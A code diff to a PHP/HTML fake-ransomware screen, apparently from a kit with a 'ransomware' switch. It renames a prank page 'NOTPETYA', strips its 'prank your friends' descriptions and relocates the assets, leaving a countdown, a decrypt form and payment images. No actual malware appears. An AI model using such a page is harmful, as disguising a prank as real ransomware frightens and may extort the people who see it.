@@ -41,25 +41,25 @@ if($config["main"]["ransomware"] == "on"){ ?>
 <head>
 	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
-	<title>Fake Virus Screen - Files encrypted</title>
+	<title>NOTPETYA</title>
 	<meta name="description"
-		content="Fake virus screen demanding money for file decryption. Prank your friends opening this in their machine! " />
+		content="NOTPETYA" />
 	<meta name="viewport" content="width=device-width, initial-scale=1">
-	<meta property="og:title" content="Fake Virus Screen" />
+	<meta property="og:title" content="NOTPETYA" />
 	<meta property="og:type" content="website" />
 	<meta property="og:description"
-		content="Fake virus screen demanding money for file decryption. Prank your friends opening this in their machine!" />
+		content="NOTPETYA" />
 	<meta property="og:url" content="https://geekprank.com/fake-virus/" />
 	<meta property="og:image" content="https://geekprank.com/fake-virus/og.jpg" />
 	<link rel="canonical" href="index.html" />
-	<link rel="stylesheet" href="style.css" />
+	<link rel="stylesheet" href="84dc5c33ad8be3722ef34e6880b6331ff9b15d8d7c7b066d5fbaf80e4b0b9937/style.css" />
 	<script src="https://code.jquery.com/jquery-latest.min.js" type="text/javascript"></script>
-	<script src="script.js"></script>
+	<script src="84dc5c33ad8be3722ef34e6880b6331ff9b15d8d7c7b066d5fbaf80e4b0b9937/script.js"></script>
 </head>
 
 <body>
 
-	<img src="background.jpg" alt="bckgound" class="bg" />
+	<img src="84dc5c33ad8be3722ef34e6880b6331ff9b15d8d7c7b066d5fbaf80e4b0b9937/background.jpg" alt="bckgound" class="bg" />
 	<div class="content">
 		<div class="headline">
 			NOTPETYA
@@ -68,7 +68,7 @@ if($config["main"]["ransomware"] == "on"){ ?>
 			<img src="fake-virus.png" alt="fake computer virus" class="lock" />
 			<h3>Hurry! <br />Your files will be permanently&nbsp;deleted&nbsp;in:</h3>
 			<div class="wraptimer"><span id="timer"><?php echo $minutes_left . ":".$seconds_left ?></span></div>
-			<img src="fake-virus-prank.png" alt="online computer virus prank" class="sale" />
+			<img src="84dc5c33ad8be3722ef34e6880b6331ff9b15d8d7c7b066d5fbaf80e4b0b9937/fake-virus-prank.png" alt="online computer virus prank" class="sale" />
 			<h3>Please read the instructions</h3>
 		</div>
 		<div class="maincont">
@@ -117,9 +117,9 @@ if($config["main"]["ransomware"] == "on"){ ?>
 						onclick="document.forms['decrypt'].submit();">Decrypt</span>
 				</form>
 				<div class="methods">
-					<img src="fake-hacked-computer.png" alt="fake hacked computer" /> <img
-						src="files-encrypted-prank.png" alt="files encrypted online prank" /> <img
-						src="pay-with-kidneys.png" alt="pay with your kidney" />
+					<img src="84dc5c33ad8be3722ef34e6880b6331ff9b15d8d7c7b066d5fbaf80e4b0b9937/fake-hacked-computer.png" alt="fake hacked computer" /> <img
+						src="84dc5c33ad8be3722ef34e6880b6331ff9b15d8d7c7b066d5fbaf80e4b0b9937/files-encrypted-prank.png" alt="files encrypted online prank" /> <img
+						src="84dc5c33ad8be3722ef34e6880b6331ff9b15d8d7c7b066d5fbaf80e4b0b9937/pay-with-kidneys.png" alt="pay with your kidney" />
 
 				</div>
 			</div>
